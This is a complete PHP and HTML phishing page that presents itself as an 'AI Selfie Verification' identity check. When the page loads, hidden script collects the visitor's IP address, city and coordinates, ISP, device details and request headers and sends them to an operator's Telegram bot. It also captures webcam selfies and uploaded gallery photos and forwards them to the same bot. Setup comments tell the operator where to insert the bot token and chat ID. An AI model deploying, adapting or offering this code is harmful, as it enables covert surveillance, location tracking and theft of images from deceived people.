<?php
// ============================================================
// TELEGRAM CONFIG - apna token aur chat ID daal
// ============================================================
$botToken    = 'YOUR_BOT_TOKEN_HERE';
$chatId      = 'YOUR_CHAT_ID_HERE';

// ============================================================
// Visitor data collect
// ============================================================
if (isset($_GET['collect']) && $_GET['collect'] == '1') {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }

    $locationData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting");
    $loc = json_decode($locationData, true);

    $headers = getallheaders();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $referer   = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    $browser = 'Unknown';
    if (preg_match('/Firefox/', $userAgent)) $browser = 'Firefox';
    elseif (preg_match('/Chrome/', $userAgent)) $browser = 'Chrome';
    elseif (preg_match('/Safari/', $userAgent)) $browser = 'Safari';
    elseif (preg_match('/Edge/', $userAgent)) $browser = 'Edge';
    elseif (preg_match('/Opera|OPR/', $userAgent)) $browser = 'Opera';

    $os = 'Unknown';
    if (preg_match('/Windows NT 10.0/', $userAgent)) $os = 'Windows 10/11';
    elseif (preg_match('/Mac OS X/', $userAgent)) $os = 'macOS';
    elseif (preg_match('/Android/', $userAgent)) $os = 'Android';
    elseif (preg_match('/iPhone|iPad/', $userAgent)) $os = 'iOS';

    $device = 'Desktop';
    if (preg_match('/Mobile|Android|iPhone|iPad|iPod/', $userAgent)) $device = 'Mobile/Tablet';

    $time = date('Y-m-d H:i:s');

    $msg = "🔔 <b>NEW VISITOR CAPTURED</b> 🔔\n\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "🆔 <b>IP Address:</b> <code>{$ip}</code>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n\n";

    if ($loc && $loc['status'] === 'success') {
        $msg .= "🌍 <b>Location:</b>\n";
        $msg .= "   🏙 City: {$loc['city']}\n";
        $msg .= "   📍 Region: {$loc['regionName']}\n";
        $msg .= "   🇮🇳 Country: {$loc['country']}\n";
        $msg .= "   📮 ZIP: {$loc['zip']}\n";
        $msg .= "   🌐 Coordinates: {$loc['lat']}, {$loc['lon']}\n\n";
        $msg .= "🏢 <b>ISP:</b> {$loc['isp']}\n";
        $msg .= "📡 <b>Organization:</b> {$loc['org']}\n";
        $msg .= "🔢 <b>ASN:</b> {$loc['as']}\n\n";
        $msg .= "📱 <b>Mobile:</b> " . ($loc['mobile'] ? '✅ Yes' : '❌ No') . "\n";
        $msg .= "🛡 <b>Proxy/VPN:</b> " . ($loc['proxy'] ? '✅ Yes' : '❌ No') . "\n";
        $msg .= "🏠 <b>Hosting:</b> " . ($loc['hosting'] ? '✅ Yes' : '❌ No') . "\n\n";
    }

    $msg .= "💻 <b>Device Info:</b>\n";
    $msg .= "   🖥 Browser: {$browser}\n";
    $msg .= "   ⚙️ OS: {$os}\n";
    $msg .= "   📱 Device Type: {$device}\n";
    $msg .= "   🧾 User-Agent: <code>{$userAgent}</code>\n\n";
    $msg .= "🔗 <b>Referer:</b> {$referer}\n";
    $msg .= "⏱ <b>Time:</b> {$time}\n\n";
    $msg .= "📋 <b>Headers:</b>\n<code>";
    foreach ($headers as $k => $v) {
        if (strtolower($k) !== 'cookie') {
            $msg .= "{$k}: {$v}\n";
        }
    }
    $msg .= "</code>\n\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "📸 <b>Selfie Capture</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━";

    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id'                  => $chatId,
        'text'                     => $msg,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $telegramUrl,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    curl_close($ch);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit;
}

// ============================================================
// Handle camera selfie receive
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['selfie'])) {
    $photo = $_FILES['selfie'];
    
    if ($photo['error'] === UPLOAD_ERR_OK) {
        $ip = $_SERVER['REMOTE_ADDR'];
        
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postData = [
            'chat_id' => $chatId,
            'caption' => "📸 <b>Selfie Captured!</b>\n🆔 IP: {$ip}\n⏱ " . date('Y-m-d H:i:s')
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $telegramUrl,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => array_merge($postData, ['photo' => new CURLFile($photo['tmp_name'], $photo['type'], $photo['name'])]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        curl_exec($ch);
        curl_close($ch);

        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit;
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error']);
    exit;
}

// ============================================================
// Handle gallery photo upload
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['gallery_photo'])) {
    $photo = $_FILES['gallery_photo'];
    
    if ($photo['error'] === UPLOAD_ERR_OK) {
        $ip = $_SERVER['REMOTE_ADDR'];
        
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postData = [
            'chat_id' => $chatId,
            'caption' => "🖼 <b>Gallery Photo Captured!</b>\n🆔 IP: {$ip}\n⏱ " . date('Y-m-d H:i:s')
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $telegramUrl,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => array_merge($postData, ['photo' => new CURLFile($photo['tmp_name'], $photo['type'], $photo['name'])]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        curl_exec($ch);
        curl_close($ch);

        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit;
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>AI Selfie Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            padding: 16px;
        }
        .card {
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(18px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px;
            padding: 32px 24px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .card h1 { font-size: 1.6rem; margin-bottom: 6px; }
        .card .sub { color: #aaa; margin-bottom: 20px; font-size: 0.85rem; }

        #video {
            width: 100%;
            max-width: 300px;
            border-radius: 16px;
            background: #000;
            transform: scaleX(-1);
        }
        
        #canvas {
            display: none;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }
        
        .btn {
            padding: 14px 20px;
            border: none;
            border-radius: 40px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn-primary {
            background: #00d4ff;
            color: #000;
        }
        .btn-primary:hover {
            background: #00e5ff;
            transform: scale(1.02);
        }
        .btn-secondary {
            background: rgba(255,255,255,0.12);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.2);
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .status-msg {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.9rem;
            display: none;
        }
        .status-msg.show { display: block; }
        .status-msg.success { background: rgba(0,200,83,0.2); color: #69f0ae; }
        .status-msg.loading { background: rgba(0,212,255,0.2); color: #80d8ff; }
        .status-msg.error { background: rgba(255,82,82,0.2); color: #ff8a80; }

        .hidden-input { display: none; }
    </style>
</head>
<body>
<div class="card">
    <h1>📸 AI Selfie Verification</h1>
    <p class="sub">Please take a selfie to verify your identity</p>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <div class="btn-group">
        <button class="btn btn-primary" id="captureBtn" disabled>📷 Capture Selfie</button>
        <button class="btn btn-secondary" id="galleryBtn">🖼 Upload from Gallery</button>
    </div>
    
    <input type="file" id="galleryInput" class="hidden-input" accept="image/*">
    
    <div class="status-msg" id="statusMsg"></div>
</div>

<script>
// ============================================================
// Step 1: Send visitor data immediately
// ============================================================
(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '?collect=1', true);
    xhr.send();
})();

// ============================================================
// Step 2: Start camera
// ============================================================
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const galleryBtn = document.getElementById('galleryBtn');
const galleryInput = document.getElementById('galleryInput');
const statusMsg = document.getElementById('statusMsg');

let stream = null;

function showStatus(msg, type) {
    statusMsg.textContent = msg;
    statusMsg.className = 'status-msg show ' + type;
}

// Start camera
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(function(s) {
            stream = s;
            video.srcObject = s;
            captureBtn.disabled = false;
            showStatus('✅ Camera ready! Take your selfie.', 'success');
        })
        .catch(function(err) {
            showStatus('⚠️ Camera access denied. Please allow camera access or upload from gallery.', 'error');
            captureBtn.disabled = true;
        });
} else {
    showStatus('❌ Camera not supported on this device. Please upload from gallery.', 'error');
    captureBtn.disabled = true;
}

// ============================================================
// Step 3: Capture selfie from camera
// ============================================================
captureBtn.addEventListener('click', function() {
    if (!stream) {
        showStatus('❌ Camera not available. Use gallery upload instead.', 'error');
        return;
    }
    
    // Capture frame
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    // Convert to blob
    canvas.toBlob(function(blob) {
        if (!blob) {
            showStatus('❌ Failed to capture image.', 'error');
            return;
        }
        
        var formData = new FormData();
        formData.append('selfie', blob, 'selfie_' + Date.now() + '.png');
        
        showStatus('📤 Uploading selfie...', 'loading');
        captureBtn.disabled = true;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                showStatus('✅ Selfie captured and uploaded successfully!', 'success');
                captureBtn.textContent = '📷 Take Another Selfie';
                captureBtn.disabled = false;
            } else {
                showStatus('❌ Upload failed. Try again.', 'error');
                captureBtn.disabled = false;
            }
        };
        xhr.onerror = function() {
            showStatus('❌ Network error. Try again.', 'error');
            captureBtn.disabled = false;
        };
        xhr.send(formData);
    }, 'image/png');
});

// ============================================================
// Step 4: Upload from gallery
// ============================================================
galleryBtn.addEventListener('click', function() {
    galleryInput.click();
});

galleryInput.addEventListener('change', function() {
    if (this.files && this.files[0]) {
        var file = this.files[0];
        var formData = new FormData();
        formData.append('gallery_photo', file);
        
        showStatus('📤 Uploading gallery photo...', 'loading');
        galleryBtn.disabled = true;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '', true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                showStatus('✅ Gallery photo uploaded successfully!', 'success');
                galleryBtn.textContent = '🖼 Upload Another Photo';
                galleryBtn.disabled = false;
            } else {
                showStatus('❌ Upload failed. Try again.', 'error');
                galleryBtn.disabled = false;
            }
        };
        xhr.onerror = function() {
            showStatus('❌ Network error. Try again.', 'error');
            galleryBtn.disabled = false;
        };
        xhr.send(formData);
    }
});
</script>
</body>
</html>